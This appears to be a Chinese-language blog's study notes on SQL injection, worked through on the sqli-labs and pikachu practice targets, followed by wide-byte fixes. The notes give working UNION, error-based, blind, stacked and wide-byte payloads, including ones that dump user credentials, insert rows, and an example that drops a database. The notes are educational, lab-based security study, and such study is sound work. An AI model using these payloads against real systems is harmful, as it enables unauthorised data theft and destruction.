<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
</ul>
<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入学习</title>
    <url>/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
<p>字符型注入</p>
<p>搜索型注入</p>
<p>宽字节注入</p>
<p>Base64变形注入</p>
<h3 id="以提交方式分类"><a href="#以提交方式分类" class="headerlink" title="以提交方式分类"></a>以提交方式分类</h3><p>GET注入</p>
<p>POST注入</p>
<p>Cookie注入</p>
<p>HTTP头注入（XFF注入、UA注入、REFERER注入）</p>
<h3 id="以获取信息的方式分类"><a href="#以获取信息的方式分类" class="headerlink" title="以获取信息的方式分类"></a>以获取信息的方式分类</h3><p>联合注入</p>
<p>报错注入</p>
<p>布尔盲注</p>
<p>时间盲注</p>
<p>堆查询注入</p>
<h2 id="判断是否存在注入点及其类型"><a href="#判断是否存在注入点及其类型" class="headerlink" title="判断是否存在注入点及其类型"></a>判断是否存在注入点及其类型</h2><h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p>可以使用单引号，双引号，单括号，双括号判断是否报错，报错的话可能存在sql注入</p>
<h4 id="判断是否为数字型"><a href="#判断是否为数字型" class="headerlink" title="判断是否为数字型"></a>判断是否为数字型</h4><p>若<code>and 1=1</code>页面正常<code>and 1=2</code>页面错误，则为数字型注入</p>
<blockquote>
<p>原理：<code>select * from 表 where id=x</code></p>
</blockquote>
<blockquote>
<p>因为如果是数字型注入的话<code>and 1=2</code>逻辑为假，会返回错误</p>
</blockquote>
<h4 id="判断是否为字符型"><a href="#判断是否为字符型" class="headerlink" title="判断是否为字符型"></a>判断是否为字符型</h4><p>若<code>&#39;and &#39;1&#39;=&#39;1 </code>页面正常，<code>&#39;and &#39;1&#39;=&#39;2</code>页面错误，则为字符型</p>
<blockquote>
<p>原理：<code>select * from 表 where id=&#39;参数&#39;</code></p>
</blockquote>
<blockquote>
<p>这里的sql语句相当于<code>select * from 表名 where id=&#39;参数&#39;and &#39;1&#39;=&#39;1&#39;</code>因为这里的参数是字符类型，而这样构造sql语句正好是字符类型</p>
</blockquote>
<p>  <strong>两者最大的区别就是字符型需要单引号来闭合，而数字型不需要</strong></p>
<h4 id="判断是否为搜索型"><a href="#判断是否为搜索型" class="headerlink" title="判断是否为搜索型"></a>判断是否为搜索型</h4><p>根据<code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code>(相当于<code>and 1=1</code>)与<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code>的回显进行判断</p>
<blockquote>
<p>原理：<code>select * from 表 where username like &#39;%$name%&#39;</code></p>
</blockquote>
<blockquote>
<p>相当于<code>select * from 表 where username like &#39;%$name%&#39; and 1=1 and &#39;%&#39;=&#39;%&#39;</code></p>
</blockquote>
<blockquote>
<p>pikachu靶场较详细的实例<a href="https://www.cnblogs.com/Hunter-01001100/p/11628286.html">pikachu-搜索型注入 #手工注入</a></p>
</blockquote>
<p>**PS:**字符型和搜索型注入可能需要注释符对<code>&#39;</code>或<code>%&#39;</code>进行注释，如上面的判断字符型注入的语句可以修改为<code>&#39; and 1=1 # </code>和<code>&#39; and 1=2 #</code>来进行判断，而这里的<code>#</code>就是对sql语句后面的<code>&#39;</code>进行注释，同理搜索型也一样</p>
<h4 id="易出现SQL注入的功能点"><a href="#易出现SQL注入的功能点" class="headerlink" title="易出现SQL注入的功能点"></a><strong>易出现SQL注入的功能点</strong></h4><blockquote>
<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的      client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
</blockquote>
<h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
<p><img src="https://i.loli.net/2021/06/23/STMinrwE5BLNzVY.png" alt="判断数据库"></p>
<h4 id="不同数据库的特殊表"><a href="#不同数据库的特殊表" class="headerlink" title="不同数据库的特殊表"></a>不同数据库的特殊表</h4><blockquote>
<p>MySQL数据库的特有的表是 <strong>information_schema.tables ,</strong> access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> ,oracle数据库特有的表是 <strong>dual</strong></p>
</blockquote>
<p>判断语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是Oracle数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure>
<p>对于MySQL数据库，<strong>information_schema</strong>数据库中的表是一个视图，都是只读的，不能进行增删改的操作</p>
<blockquote>
<p>information_schema数据库是MySQL5.0以上才有</p>
</blockquote>
<h4 id="information-schema表中三个重要的表："><a href="#information-schema表中三个重要的表：" class="headerlink" title="information_schema表中三个重要的表："></a>information_schema表中三个重要的表：</h4><ul>
<li>information_schema.<strong>schemata</strong>该表存储了所有的库名</li>
<li>information_schema.<strong>tables</strong>该表存储了所有的表名</li>
<li>information_schema.<strong>columns</strong>该表存储了所有的列名</li>
</ul>
<h2 id="0x01-union联合注入"><a href="#0x01-union联合注入" class="headerlink" title="0x01 union联合注入"></a>0x01 union联合注入</h2><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>适用于页面<strong>有显示列</strong>的注入</p>
<p>首先进行的是判断是否存在注入和确定其注入类型，然后<strong>根据注入类型</strong>依次进行列数判断、可显列、查库，查表、查列、查数据</p>
<p>以下以字符型注入为例（sqli-labs靶场）：</p>
<h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
<h4 id="可显列"><a href="#可显列" class="headerlink" title="可显列"></a>可显列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,...x #</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em><strong>id=-1</strong></em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
</blockquote>
<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><h4 id="先来了解一些常用函数"><a href="#先来了解一些常用函数" class="headerlink" title="先来了解一些常用函数"></a>先来了解一些常用函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">·  version() ：数据库的版本</span><br><span class="line"></span><br><span class="line">·  database() :当前所在的数据库</span><br><span class="line"></span><br><span class="line">·  @@basedir : 数据库的安装目录</span><br><span class="line"></span><br><span class="line">·  @@datadir ： 数据库文件的存放目录</span><br><span class="line"></span><br><span class="line">·  user() ： 数据库的用户</span><br><span class="line"></span><br><span class="line">·  current_user() : 当前用户名</span><br><span class="line"></span><br><span class="line">·  system_user() : 系统用户名</span><br><span class="line"></span><br><span class="line">·  session_user() :连接到数据库的用户名</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),system_user() --+</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/agNb9HG7lTsqodV.png" alt="image-20210509112349669"></p>
<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
</blockquote>
<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="https://i.loli.net/2021/06/23/Q7djqByu4wJFTZx.png" alt="image-20210509115335643"></p>
<p><img src="https://i.loli.net/2021/06/23/2H54FxOoripDhzE.png" alt="image-20210509115550488"></p>
<h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="https://i.loli.net/2021/06/23/e9jNZbUsJ38lOFa.png" alt="image-20210509122157896"></p>
<h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">---&#x27;,username,&#x27;---&#x27;,password),3 from users --+</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/IvUtTJPiGM7bBrV.png" alt="image-20210509122715852"></p>
<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02 报错注入"></a>0x02 报错注入</h2><h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" title="利用场景"></a>利用场景</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息（也就是union注入没有显示列）</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息。可以通过构造数据库报错语句，从报错信息中获取到想要的内容</p>
<h3 id="一、floor报错注入"><a href="#一、floor报错注入" class="headerlink" title="一、floor报错注入"></a>一、floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
<h4 id="关键函数学习"><a href="#关键函数学习" class="headerlink" title="关键函数学习"></a>关键函数学习</h4><h5 id="rand-是随机函数"><a href="#rand-是随机函数" class="headerlink" title="rand()是随机函数"></a>rand()是随机函数</h5><p>通过一个固定的随机数0之后，可以形成固定的伪随机序列（就是rand(0)产生的数据是可预知的）</p>
<h5 id="floor-是取整函数"><a href="#floor-是取整函数" class="headerlink" title="floor()是取整函数"></a>floor()是取整函数</h5><p>floor(rand(0)*2)就是对rand(0)产生的随机序列乘2之后取整，结果也是固定的</p>
<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="https://i.loli.net/2021/06/23/IEqVxQuGlW5Omwr.png" alt="image-20210509183416177"></p>
<p>形如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//分解来看</span></span><br><span class="line"><span class="string">concat(user(),floor(rand(0)*2))x起了个别名，也就是相当于concat(user(),floor(rand(0)*2))=x</span></span><br><span class="line"><span class="string">ps:这里的user()是要查询的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">同理(select count(*),x from information_schema.tables group by x)=a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就是select 1 from a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>




<p>详细原理分析：</p>
<p><a href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p>
<p>以sqli-labs中less6为例</p>
<p>union注入不会回显列信息，故使用报错注入</p>
<p><img src="https://i.loli.net/2021/06/23/3ljneN2vBXV6xJ8.png" alt="image-20210509204534799"></p>
<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">database()的位置可以嵌套sql语句进行查询</span><br><span class="line"></span><br><span class="line">//也可以通过information_schema.schemata表中的schema_name列查库</span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/DMh2Ap34ikYQCcl.png" alt="image-20210509205248015"></p>
<blockquote>
<p>security后面的1是floor(rand(0)*2)产生的数字1</p>
</blockquote>
<h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样查询的结果是只会显示一个字段，不加`limit <span class="number">0</span>,<span class="number">1</span>`又会报错`Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span>`</span><br><span class="line"></span><br><span class="line">解决办法：使用group_concat()函数查出所有内容</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/sH4W7MENVe5iQ9g.png" alt="table_name"></p>
<p><img src="https://i.loli.net/2021/06/23/8DR16C9LGcbyKPm.png" alt="group_concat(table_name)"></p>
<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="https://i.loli.net/2021/06/23/BzeDgcubZr5yFRH.png" alt="image-20210510090611516"></p>
<p>但是在查数据时会遇见一个奇怪的问题，使用*group_concat()*也出不来数据</p>
<p><img src="https://i.loli.net/2021/06/23/6T1bXrfCYkqeEvQ.png" alt="group_concat(id,username,password)"></p>
<p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
<h3 id="二、extractvalue报错注入"><a href="#二、extractvalue报错注入" class="headerlink" title="二、extractvalue报错注入"></a>二、extractvalue报错注入</h3><blockquote>
<p>MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数</p>
</blockquote>
<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
<blockquote>
<p>XML_document 是 String 格式，为 XML 文档对象的名称</p>
<p>XPath_string (Xpath 格式的字符串)</p>
</blockquote>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>从目标XML中返回包含所查询值的字符串（返回结果限制在32位字符）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="number">0x7e</span>是<span class="operator">~</span>的ASCII码</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将<span class="keyword">user</span>()换成其他payload</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>查库查表正常进行就行</p>
<p>有意思的来了</p>
<h4 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h4><p>当查列的时候会因为超过最大限度32位只会显示部分数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/23/IbhYXk9S3vRGjtC.png" alt="image-20210510100413545"></p>
<p>这里要进行<strong>截取字符串</strong></p>
<h5 id="三大法宝：mid-substr-left"><a href="#三大法宝：mid-substr-left" class="headerlink" title="三大法宝：mid(),substr(),left"></a>三大法宝：mid(),substr(),left</h5><p><code>mid(column_name,start,length)</code></p>
<blockquote>
<p>column_name就是要截取的字段</p>
<p>start就是开始位置</p>
<p>length是要截取的长度，省略的话会返回剩余字符</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>截取<span class="number">32</span>位起的字符</span><br><span class="line">mid((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;)<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>同理passwor后面的也可以截取</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/lHJgEhGduiNaYxq.png" alt="image-20210510102356419"></p>
<p><code>substr</code>使用同<code>mid()</code></p>
<p>有<code>left</code>那必定有<code>right</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)截取string字符串左起的n个字符</span><br><span class="line">right同理</span><br></pre></td></tr></table></figure>
<p>查数据，同样要进行截取</p>
<p><img src="https://i.loli.net/2021/06/23/IepENucHvlhG25r.png" alt="image-20210510110558424"></p>
<h3 id="三、updatexml报错注入"><a href="#三、updatexml报错注入" class="headerlink" title="三、updatexml报错注入"></a>三、updatexml报错注入</h3><blockquote>
<p>对比extractvalue报错注入</p>
</blockquote>
<h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><p>updatexml (XML_document, XPath_string, new_value)</p>
<blockquote>
<p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称</p>
<p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程</p>
<p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</p>
</blockquote>
<h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>改变文档中符合条件的节点的值</p>
<h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and updatexml (1,concat(0x7e,payload,0x7e),1)</span><br></pre></td></tr></table></figure>
<p>其余操作同<code>extractvalue</code></p>
<p><img src="https://i.loli.net/2021/06/23/MoAnvNQgFf3wYTZ.png" alt="image-20210623192032232"></p>
<h3 id="其他报错注入"><a href="#其他报错注入" class="headerlink" title="其他报错注入"></a>其他报错注入</h3><p>如<code>geometrycollection()``multipoint()</code>,<code>polygon()</code>,<code>multipolygon()</code>,<code>exp()</code>等等就不展开叙述了，可以百度了解更多</p>
<h2 id="0x03-盲注"><a href="#0x03-盲注" class="headerlink" title="0x03 盲注"></a>0x03 盲注</h2><h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><p>页面连错误信息都没有回显，通过盲注来验证sql语句是否执行</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>布尔盲注：页面只返回true，false两种类型的页面，利用页面的返回不同，逐个猜解数据</p>
<p>时间盲注：通过sleep()函数判断页面相应时间</p>
<p>用到的函数：<strong>ascii()、substr() 、length()，exists()、concat()</strong></p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>原理是使用了二分法来进行数据库长度、数据库名等的猜解</strong></p>
<blockquote>
<p>就是从数据库到表，再到字段，最后到数据，依次使用length函数进行长度和使用substr函数根据字符的ASCII值进行猜解</p>
</blockquote>
<blockquote>
<p>了解了原理后直接使用sqlmap工具会极大提高效率</p>
</blockquote>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>利用sleep()函数使得页面回显速度明显变慢，则存在时间盲注</p>
<h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>sql中一个分号（;）表示一条sql语句的结束，而堆叠注入就是在结束 一个sql语句后继续构造下一个语句</p>
<p>对比union联合注入</p>
<blockquote>
<p>union可以执行的语句类型是有限的，只可以用来执行查询语句</p>
<p>堆叠注入可以执行的是任意的语句</p>
<p>例：输入root’;DROP database user;实际执行的是select * from user where name=’root’;DROP  database user;</p>
</blockquote>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持或是权限等原因的限制</p>
<p>在查询数据时，通常只返回一个查询结果，因此堆叠注入的第二个语句产生的结果或者错误就会被忽略，在前端界面也看不到返回的结果</p>
<p>因此在查询、读取数据时使用union进行联合查询，而且在堆叠注入前也是需要知道一些数据库的相关信息</p>
<h3 id="例less-38"><a href="#例less-38" class="headerlink" title="例less-38"></a>例less-38</h3><p>经测试是字符型注入，使用<code>--+</code>进行过滤</p>
<p>查出users表中的数据</p>
<p><img src="https://i.loli.net/2021/06/23/rsxOhHdc8jLgPub.png" alt="image-20210623132157796"></p>
<p>使用堆叠注入进行数据修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password) values (&#39;99&#39;,&#39;newusername&#39;,&#39;newpassword&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/23/polCMfZSJ6ktI82.png"></p>
<p>​                                                                                                                                                                                                                                  </p>
<h2 id="0x05-宽字节注入"><a href="#0x05-宽字节注入" class="headerlink" title="0x05  宽字节注入"></a>0x05  宽字节注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>宽字节注入示由于不同编码中中文所占的字符长度不同，在gbk编码中，一个汉字占两个字节，而在utf-8中，一个汉字占三个字节</p>
<p>首先学习几个php中对sql注入过滤的函数：</p>
<blockquote>
<p>addslashes() 在预定义字符之前添加反斜杠\进行转义，但是并不会插入到数据库中</p>
<p>（预定义字符：单引号，双引号，反斜杠，NULL）</p>
<p>mysql_real_escape_string() 转义sql语句中的特殊符号：x00 、\n 、\r 、\ 、‘ 、“ 、x1a</p>
<p>魔术引号：将预定义字符加上反斜杠\进行转义，作用同addslashes()，所以这两个打开一个即可。魔术引号有以下三个</p>
<blockquote>
<p>magic_quotes_gps() 默认为on （php5.4.0以上已经被移除）</p>
<p>magic_quotes_runtime() 默认为off</p>
<p>magic_quotes_sybase() 默认为off</p>
</blockquote>
</blockquote>
<p>因为这些函数会加反斜杠\进行字符转义，所以要使用宽字节进行绕过</p>
<p>宽字节注入利用的是mysql的一个特性，当mysql在使用gbk编码时，会认为<strong>两个字符是一个汉字</strong>，而前提就是<strong>第一个字符的ASCII值要大于128</strong>，才是认为是汉字</p>
<blockquote>
<p><code>1%df\&#39;</code>中\会被url编码成<code>%25df%5C%27</code>其中的<code>%25df%5C</code>会被当做汉字来处理，从而<code>%27</code>逃脱出来，然后就发生了报错</p>
<p>又因为只需要输入的数据ASCII大于128才会被认为两个字符是一个汉字，所以输入的数据大于等于%81即可使’逃脱出来</p>
</blockquote>
<h3 id="例less-32"><a href="#例less-32" class="headerlink" title="例less-32"></a>例less-32</h3><p><img src="https://i.loli.net/2021/06/23/baM9mL8S5InXVjz.png" alt="image-20210623170134200"></p>
<p>会发现单引号，双引号均会被转义前面加了反斜杠\</p>
<p>使用宽字节进行绕过</p>
<p><img src="https://i.loli.net/2021/06/23/gh6mH84ESM2IRKX.png" alt="image-20210623172114654"></p>
<p>然后配合联合查询进行注入</p>
<p>还需要注意的是因为双引号被过滤，所以要对字符串<code>&quot;security&quot;</code>、<code>&quot;users&quot;</code><strong>十六进制转换</strong>将<code>security</code>16进制转码为<code>7365637572697479</code>，<code>users</code>转换为<code>7573657273</code>，最后还要加上**<code>0x</code>**</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><h4 id="mysql-real-escape-string-函数之前设置字符集"><a href="#mysql-real-escape-string-函数之前设置字符集" class="headerlink" title="mysql_real_escape_string()函数之前设置字符集"></a>mysql_real_escape_string()函数之前设置字符集</h4><p>当将<code>addslashe()</code>替换为<code>mysql_real_escape_string()</code>函数后，如果没有指定php连接mysql的字符集，也就是没有在执行sql语句前调用mysql_set_charset函数设置当前连接的字符集为gbk <code>mysql_set_charset=(‘gbk’,$conn)</code>，就会导致宽字节注入</p>
<p>而修复方法就是在调用<code>mysql_real_escape_string()</code>之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset=(‘gbk’,$conn)</strong></p>
<h4 id="character-set-client-设置为binary-二进制"><a href="#character-set-client-设置为binary-二进制" class="headerlink" title="character_set_client 设置为binary(二进制)"></a>character_set_client 设置为binary(二进制)</h4><p>需要在所有的sql语句前指定连接的形式是binary二进制：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为mysql收到客户端请求的数据时，会认为收到的编码格式是<code>character_set_client</code>对应的编码，然后会转换为<code>character_set_connection</code>对应的编码，当进入表查询字段的信息时又会转换为字段所对应的编码，而在产生查询结果后又会从字段对应的编码转换为<code>character_set_results</code>的编码形式，最后返回给客户端</p>
